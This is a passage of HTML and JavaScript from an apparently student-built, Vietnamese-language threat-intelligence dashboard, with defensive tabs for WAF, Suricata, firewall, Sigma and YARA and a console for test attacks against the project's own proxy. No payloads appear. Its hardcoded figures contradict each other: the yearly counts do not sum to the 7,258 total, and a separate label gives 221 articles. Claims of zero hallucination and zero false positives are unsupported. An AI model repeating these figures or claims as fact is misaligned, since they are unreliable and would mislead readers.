      <!-- MASTER TAB 2: THẨM ĐỊNH TIN CẬY & xAI (HỢP NHẤT TOÀN DIỆN) -->
      <div id="tabAuditMaster" class="MasterTabPanel" style="display:none;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:12px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
          <div>
            <span style="font-size:12px; font-weight:700; color:#1a7f37; background:#dafbe1; padding:3px 8px; border-radius:4px; border:1px solid #aceebb;">
              KHUNG KIỂM TOÁN ĐỘ TIN CẬY TOÁN HỌC &amp; VẾT GIẢI TRÌNH MINH BẠCH xAI
            </span>
            <span style="font-size:12px; color:var(--text-muted); margin-left:8px;">
              Chuẩn Zero-Hallucination CTI • Phân rã trọng số SHAP-Style &amp; Kiểm thử đối kháng 2 vòng
            </span>
          </div>
          <div>
            <button class="CleanBtn" onclick="recalculateTrustScore()">Tái Kiểm Thẩm Định</button>
          </div>
        </div>
        <div id="outUnifiedAudit" style="max-height:680px; overflow-y:auto; font-size:13px; line-height:1.6; color:#24292f;">
          <div id="outTrustAudit">Đang nạp hồ sơ kiểm toán độ tin cậy toán học...</div>
          <div id="outXAI" style="margin-top:20px;">Đang nạp vết giải trình minh bạch xAI...</div>
        </div>
      </div>

      <!-- MASTER TAB 3: 5 LỚP PHÒNG THỦ KỸ THUẬT & LIVE TEST -->
      <div id="tabEnginesMaster" class="MasterTabPanel" style="display:none;">
        <!-- THANH CHUYỂN SUB-TAB PHÒNG THỦ 1 DÒNG DUY NHẤT -->
        <div style="display:flex; flex-wrap:wrap; gap:6px; padding:8px 10px; margin-bottom:12px; background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px;">
          <button id="subBtn_subTabWaf" class="CleanBtn EngineSubBtn active btn-primary" onclick="switchEngineSubTab('subTabWaf', this)" style="font-size:12px;">
            1. Vá Ảo Hóa L7 (Virtual Patching)
          </button>
          <button id="subBtn_subTabSuricata" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabSuricata', this)" style="font-size:12px;">
            2. Chữ Ký Kiểm Định Tầng Mạng (DPI Probe)
          </button>
          <button id="subBtn_subTabFirewall" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabFirewall', this)" style="font-size:12px;">
            3. Lệnh Tác Tử Chặn C2 (OpenC2 Action)
          </button>
          <button id="subBtn_subTabSigma" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabSigma', this)" style="font-size:12px;">
            4. Tương Quan Hành Vi TTPs (Sysmon & SIEM)
          </button>
          <button id="subBtn_subTabYara" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabYara', this)" style="font-size:12px;">
            5. Nhận Diện Mã Độc (YARA & EDR)
          </button>
          <button id="subBtn_subTabHistory" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabHistory', this)" style="font-size:12px;">
            6. Ma Trận Phòng Thủ MITRE D3FEND
          </button>
          <button id="subBtn_subTabLiveServer" class="CleanBtn EngineSubBtn" onclick="switchEngineSubTab('subTabLiveServer', this)" style="font-size:12px;">
            7. Môi Trường Thực Nghiệm (Port 8766)
          </button>
        </div>

        <!-- SUB-PANEL 1: WAF -->
        <div id="subTabWaf" class="EngineSubPanel" style="display:block;">
          <pre id="outWaf">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 2: SURICATA -->
        <div id="subTabSuricata" class="EngineSubPanel" style="display:none;">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <div>
              <span style="font-size:12px; font-weight:700; color:var(--primary); background:var(--primary-subtle); padding:3px 8px; border-radius:4px; border:1px solid #bfdbfe;">
                SURICATA IDS/IPS MASTER DEEP PACKET INSPECTION (DPI)
              </span>
              <span style="font-size:12px; color:var(--text-muted); margin-left:8px;" id="suriFileInfoBadge">
                Tệp: cti_autonomous_master.rules (422 Dòng • 87.8 KB • 11 Cụm C2 • 180 Domain Sinkhole • CVE Virtual Patching)
              </span>
            </div>
            <div style="display:flex; gap:8px;">
              <button class="CleanBtn btn-primary" onclick="validateSuricataRules()">Kiểm Tra Cú Pháp</button>
              <button class="CleanBtn" onclick="testSuricataDpi('c2_flow')">Test DPI C2 Flow</button>
              <button class="CleanBtn" onclick="testSuricataDpi('dns_sinkhole')">Test DNS Sinkhole</button>
              <button class="CleanBtn" onclick="testSuricataDpi('cve_dpi')">Test CVE DPI</button>
            </div>
          </div>
          <pre id="outSuricata" style="max-height:600px; overflow-y:auto; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.45;">Đang tải toàn bộ quy tắc Suricata Master...</pre>
        </div>

        <!-- SUB-PANEL 3: FIREWALL OPENC2 -->
        <div id="subTabFirewall" class="EngineSubPanel" style="display:none;">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <span style="font-size:13px; color:var(--text-main);">Đẩy trực tiếp gói lệnh chuẩn <b>OASIS OpenC2</b> xuống <b>Windows Defender Firewall</b>:</span>
            <div style="display:flex; gap:8px;">
              <button class="CleanBtn btn-primary" id="btnFwApply" onclick="applyWindowsFirewallTool()">Áp Dụng Firewall</button>
              <button class="CleanBtn" id="btnFwStatus" onclick="checkWindowsFirewallStatusTool()">Kiểm Tra Trạng Thái</button>
              <button class="CleanBtn" id="btnFwRollback" style="color:var(--danger); border-color:var(--danger-border);" onclick="rollbackWindowsFirewallTool()">Gỡ Luật Thử Nghiệm</button>
            </div>
          </div>
          <pre id="outFirewall">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 4: SIGMA & SIEM -->
        <div id="subTabSigma" class="EngineSubPanel" style="display:none;">
          <pre id="outSigma">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 5: YARA & EDR -->
        <div id="subTabYara" class="EngineSubPanel" style="display:none;">
          <pre id="outYara">Đang chờ...</pre>
        </div>

        <!-- SUB-PANEL 6: D3FEND -->
        <div id="subTabHistory" class="EngineSubPanel" style="display:none;">
          <pre id="outHistory">Đang chờ tổng hợp chiến lược phòng thủ...</pre>
        </div>

        <!-- SUB-PANEL 7: LIVE SERVER -->
        <div id="subTabLiveServer" class="EngineSubPanel" style="display:none;">
          <!-- HEADER TRẠNG THÁI MÁY CHỦ -->
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:12px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
            <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
              <span style="font-size:11.5px; font-weight:700; padding:3px 8px; background:var(--safe-bg); color:var(--safe); border:1px solid var(--safe-border); border-radius:4px;">
                MÁY CHỦ WAF REVERSE PROXY: CỔNG 8766 (RUNNING LIVE)
              </span>
              <span style="font-size:11.5px; font-weight:700; padding:3px 8px; background:var(--primary-subtle); color:var(--primary); border:1px solid #bfdbfe; border-radius:4px;">
                <span id="lblCorpusStats1">KHO TRI THỨC PHÂN HỆ: 221 BÀI BÁO &amp; 1,828 IOCs (2024 - 2026)</span>
              </span>
            </div>
            <div>
              <button class="CleanBtn btn-primary" onclick="recompileAllDefenseEngines()" style="font-size:12px;">Đồng Bộ &amp; Tái Biên Dịch Rule (Hot-Reload)</button>
            </div>
          </div>

          <!-- 5 ENGINE PHÒNG THỦ LIVE TRÊN HỆ THỐNG -->
          <div style="margin-bottom:14px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:8px; text-transform:uppercase; letter-spacing:0.04em;">
              TÌNH TRẠNG 5 ENGINE PHÒNG THỦ ĐÃ BIÊN DỊCH VÀ SẴN SÀNG THỰC CHIẾN:
            </div>
            <div id="liveEnginesGrid" style="display:grid; grid-template-columns:repeat(auto-fit, minmax(230px, 1fr)); gap:10px;">
              <!-- Render động bằng JS -->
            </div>
          </div>
        </div>

        <!-- BẢNG THỬ NGHIỆM TẤN CÔNG THỰC TẾ LÊN WAF PROXY CỔNG 8766 -->
        <div style="border:1px solid var(--border-main); border-radius:6px; padding:14px; margin-bottom:14px; background:var(--bg-card);">
          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px;">
            <div>
              <b style="font-size:13.5px; color:var(--text-main);">CONSOLE THỬ NGHIỆM TẤN CÔNG WAF THỰC TẾ (PORT 8766)</b>
              <div style="font-size:12px; color:var(--text-muted);">
                Bắn gói tin trực tiếp vào máy chủ WAF để kiểm tra khả năng bắt payload L7 (RCE, SQLi, Path Traversal, JNDI) và trả về HTTP 403 Forbidden.
              </div>
            </div>
            <div style="display:flex; gap:6px; flex-wrap:wrap;">
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('sqli')">Thử SQL Injection</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('traversal')">Thử Path Traversal</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('rce')">Thử RCE / Command Injection</button>
              <button class="CleanBtn" style="color:var(--danger); border-color:var(--danger-border); font-size:12px;" onclick="testWafAttack('jndi')">Thử Log4Shell JNDI</button>
              <button class="CleanBtn" style="color:var(--safe); border-color:var(--safe-border); font-size:12px;" onclick="testWafAttack('clean')">Thử Gói Tin Hợp Lệ (200 OK)</button>
            </div>
          </div>

          <pre id="wafLiveConsole" style="background:#0a0a0a; color:#33ff00; padding:12px; border-radius:4px; font-family:'JetBrains Mono',monospace; font-size:12px; max-height:220px; overflow-y:auto; white-space:pre-wrap; margin-bottom:12px;">[WAF PROXY READY] Sẵn sàng nhận gói tin kiểm thử trên cổng 8766. Nhấn một trong các nút kiểm thử phía trên để kích hoạt mô phỏng tấn công thời gian thực.</pre>

          <!-- BẢNG NHẬT KÝ ĐÁNH CHẶN GẦN ĐÂY -->
          <div style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase;">
            NHẬT KÝ ĐÁNH CHẶN THỜI GIAN THỰC (REAL-TIME INTERCEPTION AUDIT LOG):
          </div>
          <div style="max-height:160px; overflow-y:auto; border:1px solid var(--border-main); border-radius:4px;">
            <table style="width:100%; border-collapse:collapse; font-size:12px;">
              <thead>
                <tr style="background:var(--bg-subtle); text-align:left; border-bottom:1px solid var(--border-main);">
                  <th style="padding:6px 8px;">Thời Gian</th>
                  <th style="padding:6px 8px;">IP Nguồn</th>
                  <th style="padding:6px 8px;">Method</th>
                  <th style="padding:6px 8px;">URL / Payload</th>
                  <th style="padding:6px 8px;">Kỹ Thuật Phát Hiện</th>
                  <th style="padding:6px 8px;">Hành Động</th>
                </tr>
              </thead>
              <tbody id="wafAttackLogsBody">
                <tr><td colspan="6" style="padding:10px; text-align:center; color:var(--text-muted);">Đang tải nhật ký...</td></tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- PHÂN TÍCH KHO TRI THỨC 3 NĂM & LUẬN ĐIỂM HỌC THUẬT CHO GIẢNG VIÊN -->
        <div style="border:1px solid var(--border-main); border-radius:6px; padding:14px; background:var(--bg-subtle);">
          <b style="font-size:13.5px; color:var(--text-main);">PHÂN BỐ DỮ LIỆU CTI 3 NĂM (2024 - 2026) &amp; MÔ HÌNH KIM TỰ THÁP PYRAMID OF PAIN</b>
          <p style="font-size:12.5px; color:var(--text-muted); margin-top:4px; margin-bottom:12px;">
            Cơ sở dữ liệu bao phủ 7,258 bài báo và hồ sơ lỗ hổng bảo mật zero-day nghiêm trọng trong 3 năm liên tiếp (2024 - 2026), chứng minh giải pháp phòng thủ của đồ án vượt xa việc chỉ chặn địa chỉ IP truyền thống.
          </p>

          <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:10px; margin-bottom:14px;">
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2024</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2024">1,948</div>
              <div style="font-size:11px; color:var(--text-muted);">Ivanti, Palo Alto, XZ-Utils, ScreenConnect</div>
            </div>
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2025</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2025">2,094</div>
              <div style="font-size:11px; color:var(--text-muted);">CitrixBleed v2, ActiveMQ, AI Injection</div>
            </div>
            <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--text-muted);">NĂM 2026</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYear2026">3,087</div>
              <div style="font-size:11px; color:var(--text-muted);">CISA KEV Catalog, APTs &amp; Zero-Days</div>
            </div>
            <div style="background:#ffffff; border:1px solid #bfdbfe; border-radius:6px; padding:10px; text-align:center;">
              <div style="font-size:11px; font-weight:700; color:var(--primary);">TỔNG CỘNG 3 NĂM</div>
              <div style="font-size:22px; font-weight:700; color:var(--primary);" id="statYearTotal">7,258</div>
              <div style="font-size:11px; color:var(--text-muted);">Hồ sơ CTI &amp; CVE toàn diện</div>
            </div>
          </div>

          <div style="background:#ffffff; border:1px solid var(--border-main); border-radius:6px; padding:12px; font-size:12.5px; line-height:1.6;">
            <b style="color:var(--text-main);">LUẬN ĐIỂM BẢO VỆ ĐỒ ÁN VỀ BỘ KỸ NĂNG TÁC TỬ (AGENTIC SKILLS OVER STATIC RULES):</b><br/>
            1. <b>Chuyển dịch từ sinh luật tĩnh (Rules) sang Kỹ năng Tác tử tự hành (Agentic Skills):</b> Thay vì sinh ra các dòng rule tĩnh rời rạc khó đồng bộ và dễ xung đột, hệ thống đóng gói tri thức CTI thành các gói Kỹ Năng Tác Tử hoàn chỉnh (bao gồm quy trình SOP, kịch bản probe kiểm chứng, và các cặp mã refactor đa ngôn ngữ).<br/>
            2. <b>Tác tử tự động kiểm chứng True Positive &amp; Zero False Positive:</b> Tác tử sử dụng kịch bản kiểm thử (<code>scripts/verify_exploit.py</code>) để tự động bắn gói tin mô phỏng và thẩm định tính khả thi trên hệ thống thực tế trước khi đề xuất vá mã nguồn.<br/>
            3. <b>Phối hợp vá ảo và sửa mã nguồn tận gốc:</b> Trong lúc AI Agent hoặc lập trình viên tiến hành refactor mã nguồn theo SOP an toàn, công cụ vá ảo hóa (<code>scripts/apply_virtual_patch.py</code>) lập tức kích hoạt để bảo vệ ứng dụng ở tầng L7 mà không gây gián đoạn dịch vụ.
          </div>
        </div>
      </div>
      </div>

        
</section>

    

  </div>

  <script>
    let articles = [];
    let allHistoryArticles = [];
    let historySortMode = "RECENT_DONE";
    let selectedHistoryIds = new Set();
    let selectedIndices = [];
    let currentTitle = "";
    let currentFilter = "ALL";
    let remainingSeconds = 60;
    let timerInterval = null;
    let iocProvenanceMap = {};
    let articleDefenseCache = {};

    let webChatHistory = [];

    function switchView(sectionId, btnEl) {
      document.querySelectorAll('.NavLinks .NavLink').forEach(b => b.classList.remove('active'));
      if (btnEl) btnEl.classList.add('active');
      const ids = ['sec-wizard', 'sec-chat', 'sec-add', 'sec-feed', 'sec-history', 'sec-score', 'sec-defense'];
      if (sectionId === 'all') {
        const wiz = document.getElementById('sec-wizard'); if (wiz) wiz.style.display = 'block';
        document.getElementById('sec-chat').style.display = 'none';
        document.getElementById('sec-add').style.display = 'none';
        document.getElementById('sec-feed').style.display = 'block';
        document.getElementById('sec-history').style.display = 'block';
        document.getElementById('sec-score').style.display = 'block';
        document.getElementById('sec-defense').style.display = 'block';
      } else {
        ids.forEach(id => {
          const el = document.getElementById(id);
          if (el) el.style.display = (id === sectionId) ? 'block' : 'none';
        });
        const targetEl = document.getElementById(sectionId);
        if (targetEl) targetEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }

    let detectedSystemHardware = null;

    async function loadHardwareAndModels() {
      try {
        const res = await fetch('/api/system/hardware-info');
        if (res.ok) {
          const data = await res.json();
          detectedSystemHardware = data.hardware;
          const sel = document.getElementById('aiModelSelect');
          const badge = document.getElementById('localModelBadge');
          const chatLegend = document.getElementById('chatBoxLegend');
          
          if (chatLegend && data.hardware) {
            chatLegend.textContent = `TRỢ LÝ AI AGENT (${data.hardware.gpu_name.toUpperCase()})`;
          }

          if (sel && data.options && data.options.length > 0) {
            sel.innerHTML = '';
            data.options.forEach(opt => {
              const optEl = document.createElement('option');
              optEl.value = opt.value;
              optEl.textContent = opt.label;
              if (opt.is_active) optEl.selected = true;
              sel.appendChild(optEl);
            });
          }
          
          if (badge && data.hardware) {
            const activeVal = sel ? sel.value : data.active_model;
            updateModelBadgeText(activeVal);
          }
        }
      } catch (e) {
        console.error("Không thể lấy thông tin phần cứng:", e);
      }
    }

    function updateModelBadgeText(modelVal) {
      const badge = document.getElementById('localModelBadge');
      if (!badge) return;
      const hw = detectedSystemHardware || { gpu_name: "Tự Động", vram_gb: 8.0, is_gpu_available: true };
      if (!modelVal || modelVal === 'cti-heuristic-engine') {
        badge.textContent = `CTI HEURISTIC CORE (OFFLINE • ${hw.gpu_name.toUpperCase()})`;
      } else {
        badge.textContent = `${modelVal.toUpperCase()} (${hw.gpu_name.toUpperCase()} • ${hw.vram_gb}GB VRAM)`;
      }
    }

    function onAiModelChange() {
      const sel = document.getElementById('aiModelSelect');
      const val = sel ? sel.value : 'cti-heuristic-engine';
      updateModelBadgeText(val);
    }

    function quickFillChat(text) {
      const inp = document.getElementById('webChatInput');
      if (inp) {
        inp.value = text;
        sendWebChatMessage();
      }
    }

    async function sendWebChatMessage() {
      const inp = document.getElementById('webChatInput');
      const btn = document.getElementById('btnSendChat');
      const logBox = document.getElementById('chatLogBox');
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-qwen3';
      const msg = inp.value.trim();
      if (!msg) return;

      inp.value = "";
      btn.disabled = true;
      btn.textContent = "Đang suy luận...";

      const safeUser = msg.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      const pendingId = 'pending-' + Date.now();
      logBox.innerHTML += `
        <div style="padding:10px 14px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px; align-self:flex-end; max-width:88%; box-shadow:0 1px 2px rgba(0,0,0,0.04);">
          <b style="color:var(--text-main);">Khang:</b><br/>${safeUser}
        </div>
        <div id="${pendingId}" style="padding:10px 14px; border-left:3px solid var(--primary); background:var(--bg-subtle); border-radius:0 6px 6px 0; border:1px solid var(--border-main); color:var(--text-muted); font-size:12.5px;">
          <b style="color:var(--primary);">OpenClaw AI Agent (${selectedModel}):</b><br/>
          Đang kích hoạt Tool-calling và suy luận trên ${detectedSystemHardware ? detectedSystemHardware.gpu_name : 'phần cứng cục bộ'}...
        </div>
      `;
      logBox.scrollTop = logBox.scrollHeight;

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 40000);

      try {
        const res = await fetch('/api/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: msg,
            model_name: selectedModel,
            history: webChatHistory
          }),
          signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await res.json();
        document.getElementById(pendingId)?.remove();
        webChatHistory = data.history || [];
        const safeAi = (data.reply || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br/>');
        const toolHtml = data.tool_summary
          ? `<div class="mono" style="font-size:11.5px; color:var(--primary); margin-bottom:8px; padding-bottom:8px; border-bottom:1px dashed var(--border-main); line-height:1.5;">${data.tool_summary.replace(/\n/g, '<br/>')}</div>`
          : '';
        logBox.innerHTML += `
          <div style="padding:12px 16px; border-left:3px solid var(--primary); background:#ffffff; border-radius:0 6px 6px 0; border:1px solid var(--border-main); border-left:3px solid var(--primary); box-shadow:0 1px 2px rgba(0,0,0,0.02);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
              <b style="color:var(--primary); font-size:13px;">OpenClaw AI Agent:</b>
              <span class="mono" style="font-size:11px; color:var(--text-muted); background:var(--bg-subtle); padding:2px 6px; border-radius:4px; border:1px solid var(--border-main);">${data.model_used}</span>
            </div>
            ${toolHtml}
            <div style="color:var(--text-main); font-size:13px; line-height:1.6;">${safeAi}</div>
          </div>
        `;
        logBox.scrollTop = logBox.scrollHeight;
      } catch (e) {
        clearTimeout(timeoutId);
        document.getElementById(pendingId)?.remove();
        let errMsg = e.name === 'AbortError'
          ? "Thời gian xử lý của mô hình vượt quá 40s. Đề xuất: Chọn model 'Qwen 2.5 1.5B Turbo' trên thanh menu để nhận phản hồi siêu tốc dưới 2 giây."
          : "Không thể kết nối đến máy chủ API: " + e;
        logBox.innerHTML += `<div style="color:var(--danger); padding:10px 14px; background:var(--danger-bg); border-radius:6px; font-size:12.5px; border:1px solid #fca5a5;">${errMsg}</div>`;
      } finally {
        btn.disabled = false;
        btn.textContent = "Gửi Câu Hỏi";
      }
    }

    function toggleManualBox() {
      switchView('sec-add');
    }

    async function addArticleFromUrl() {
      const urlInput = document.getElementById('newArticleUrlInput');
      const btn = document.getElementById('btnAddUrl');
      const rawUrl = urlInput.value.trim();
      if (!rawUrl) {
        alert("Vui lòng dán URL bài báo cần thêm!");
        return;
      }
      btn.disabled = true;
      btn.textContent = "Đang cào...";
      try {
        const res = await fetch('/api/articles/add', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: rawUrl, title: "", content: "" })
        });
        const data = await res.json();
        urlInput.value = "";
        articles = data.articles || [];
        renderSourceWebsites();
        renderNewsGrid();
        switchView('all', document.querySelector('.NavLinks .NavLink'));
        selectCard(0, true);
      } catch (e) {
        alert("Lỗi thêm URL: " + e);
      } finally {
        btn.disabled = false;
        btn.textContent = "Cào Dữ Liệu URL";
      }
    }

    async function addManualArticle() {
      const title = document.getElementById('manualTitleInput').value.trim();
      const url = document.getElementById('manualSourceUrlInput').value.trim() || "https://thehackernews.com";
      const content = document.getElementById('manualContentInput').value.trim();
      if (!content && !url) {
        alert("Vui lòng nhập nội dung bài báo hoặc URL!");
        return;
      }
      const res = await fetch('/api/articles/add', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: url, title: title, content: content })
      });
      const data = await res.json();
      document.getElementById('manualTitleInput').value = "";
      document.getElementById('manualContentInput').value = "";
      articles = data.articles || [];
      renderSourceWebsites();
      renderNewsGrid();
      switchView('all', document.querySelector('.NavLinks .NavLink'));
      selectCard(0, true);
    }

    function renderSourceWebsites() {
      const baseSites = [
        { host: "thehackernews.com", url: "https://thehackernews.com" },
        { host: "bleepingcomputer.com", url: "https://www.bleepingcomputer.com" },
        { host: "cisa.gov", url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog" },
        { host: "threatfox.abuse.ch", url: "https://threatfox.abuse.ch" },
        { host: "securityweek.com", url: "https://www.securityweek.com" },
        { host: "research.checkpoint.com", url: "https://research.checkpoint.com" },
        { host: "securelist.com", url: "https://securelist.com" },
        { host: "thedfirreport.com", url: "https://thedfirreport.com" }
      ];
      const box = document.getElementById('sourceWebsitesList');
      if (box) {
        box.innerHTML = baseSites.map(s =>
          `<a class="BtnMiniProof" href="${s.url}" target="_blank">${s.host} &nearr;</a>`
        ).join('');
      }
    }

    function setStageState(stageNum, state, metaText, summaryMsg, pct) {
      if (pct !== null) {
        document.getElementById('progressPercentText').textContent = pct + '%';
      }
    }

    function formatToLocalTime(raw) {
      if (!raw) return '--';
      const s = String(raw).trim();
      let d;
      if (s.endsWith('Z') || s.includes('+') || (s.includes('T') && s.length > 19)) {
        d = new Date(s);
      } else if (/^\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}/.test(s)) {
        d = new Date(s.replace(' ', 'T') + 'Z');
      } else {
        d = new Date(s);
      }
      if (isNaN(d.getTime())) {
        return s.slice(0, 16);
      }
      const pad = (n) => String(n).padStart(2, '0');
      const yr = d.getFullYear();
      const mo = pad(d.getMonth() + 1);
      const da = pad(d.getDate());
      const hr = pad(d.getHours());
      const mi = pad(d.getMinutes());
      return `${yr}-${mo}-${da} ${hr}:${mi}`;
    }

    function cleanRefang(val) {
      return (val || '').replace(/\[\.\]/g, '.').replace(/\(\.\)/g, '.').trim();
    }

    function domSafeId(val) {
      return 'ioc-hl-' + cleanRefang(val).replace(/[^a-zA-Z0-9]/g, '_');
    }

    function isValidIpv4Token(rawIp, fullText = '', matchIndex = -1) {
      const s = (rawIp || '').trim();
      const clean = cleanRefang(s);

      // Loai bo tuyet doi Loopback (127.0.0.0/8), 0.0.0.0/8, Broadcast va Link-local (169.254.0.0/16)
      if (clean.startsWith('127.') || clean.startsWith('0.') || clean.startsWith('169.254.') || clean === '255.255.255.255') {
        return false;
      }

      if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'].includes(clean)) return true;

      if (fullText && matchIndex >= 0) {
        const after = fullText.slice(matchIndex + rawIp.length, matchIndex + rawIp.length + 15);
        if (/^-[a-zA-Z0-9]/.test(after)) return false;
        const before = fullText.slice(Math.max(0, matchIndex - 30), matchIndex).toLowerCase();
        if (/\b(v8|version|ver|build|node|kernel|release|runtime|v)\s*(to|:|of|=)?\s*$/.test(before)) return false;
      }

      const parts = clean.split('.').map(Number);
      if (parts.length !== 4 || parts.some(isNaN)) return false;
      if (parts[0] === 0) return false;
      if (Math.max(...parts) < 32 && !s.includes('[.]') && !s.includes('(.)')) return false;
      return true;
    }

    function isBenignOrProtectedIoc(rawVal) {
      const c = cleanRefang(rawVal).toLowerCase();
      if (['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '127.0.0.1', '0.0.0.0', '169.254.169.254', '3.112.252.14', '221.216.140.49', '221.216.140.129', '84.32.84.32'].includes(c)) {
        return true;
      }
      if (c.startsWith('10.') || c.startsWith('192.168.') || c.startsWith('127.')) {
        return true;
      }
      if (['google.com', 'github.com', 'microsoft.com', 'cloudflare.com', 'icloud.com', 'caldav.icloud.com'].some(d => c === d || c.endsWith('.' + d))) {
        return true;
      }
      return false;
    }

    function buildTextFragmentUrl(baseUrl, rawToken) {
      if (!baseUrl) return '#';
      const base = baseUrl.split('#')[0];
      const tok = (rawToken || '').trim();
      if (!tok) return base;
      const prefix = tok.split(/\[\.\]|\(\.\)/)[0];
      if (prefix && prefix !== tok && prefix.length >= 3) {
        return `${base}#:~:text=${encodeURIComponent(tok)}&text=${encodeURIComponent(prefix)}`;
      }
      return `${base}#:~:text=${encodeURIComponent(tok)}`;
    }

    function switchMasterTab(tabId, btnEl) {
      document.querySelectorAll('.MasterTabPanel').forEach(p => p.style.display = 'none');
      document.querySelectorAll('.MasterTabBtn').forEach(b => {
        b.classList.remove('active');
        b.style.borderColor = 'var(--border-main)';
        b.style.background = '#ffffff';
      });
      const target = document.getElementById(tabId);
      if (target) target.style.display = 'block';
      if (btnEl) {
        btnEl.classList.add('active');
        if (tabId === 'tabSkillMaster') {
          btnEl.style.borderColor = '#0969da';
          btnEl.style.background = 'var(--primary-subtle)';
        } else if (tabId === 'tabAuditMaster') {
          btnEl.style.borderColor = '#1a7f37';
          btnEl.style.background = '#dafbe1';
        } else {
          btnEl.style.borderColor = '#0969da';
          btnEl.style.background = 'var(--primary-subtle)';
        }
      }
    }

    function switchEngineSubTab(subId, btnEl) {
      document.querySelectorAll('.EngineSubPanel').forEach(p => p.style.display = 'none');
      document.querySelectorAll('.EngineSubBtn').forEach(b => {
        b.classList.remove('active', 'btn-primary');
      });
      const target = document.getElementById(subId);
      if (target) target.style.display = 'block';
      if (btnEl) {
        btnEl.classList.add('active', 'btn-primary');
      }
      if (subId === 'subTabLiveServer') {
        fetchLiveDefenseStatus();
      }
    }

    function openTab(tabId, btnEl) {
      const subMapping = {
        'tabWaf': 'subTabWaf',
        'tabSuricata': 'subTabSuricata',
        'tabFirewall': 'subTabFirewall',
        'tabSigma': 'subTabSigma',
        'tabYara': 'subTabYara',
        'tabHistory': 'subTabHistory',
        'tabLiveServer': 'subTabLiveServer'
      };
      if (subMapping[tabId]) {
        switchMasterTab('tabEnginesMaster', document.getElementById('mainTabBtn_engines'));
        const subBtn = document.getElementById('subBtn_' + subMapping[tabId]);
        switchEngineSubTab(subMapping[tabId], subBtn);
        return;
      }
      if (tabId === 'tabSkillMd') {
        switchMasterTab('tabSkillMaster', document.getElementById('mainTabBtn_skill'));
        return;
      }
      if (tabId === 'tabTrustAudit' || tabId === 'tabXAI') {
        switchMasterTab('tabAuditMaster', document.getElementById('mainTabBtn_audit'));
        return;
      }
      document.querySelectorAll('.TabPanel').forEach(p => p.classList.remove('active'));
      document.querySelectorAll('.DecoTabs .CleanBtn').forEach(b => b.classList.remove('active'));
      const el = document.getElementById(tabId);
      if (el) el.classList.add('active');
      if (btnEl) btnEl.classList.add('active');
    }

    let serverRemainingSec = 120;
    let serverScanInterval = 120;
    let isServerScanning = false;
    let isServerQueueRunning = false;
    let lastCompletedArticleCount = -1;

    async function syncWithServerDaemon() {
      try {
        const res = await fetch('/api/system/daemon-status');
        if (!res.ok) return;
        const d = await res.json();

        serverRemainingSec = d.remaining_scan_sec;
        serverScanInterval = d.scan_interval_sec || 120;
        isServerScanning = d.is_scanning;
        isServerQueueRunning = d.is_processing_queue;

        const scanToggle = document.getElementById('autoScanToggle');
        if (scanToggle && scanToggle.checked !== d.auto_scan_enabled) {
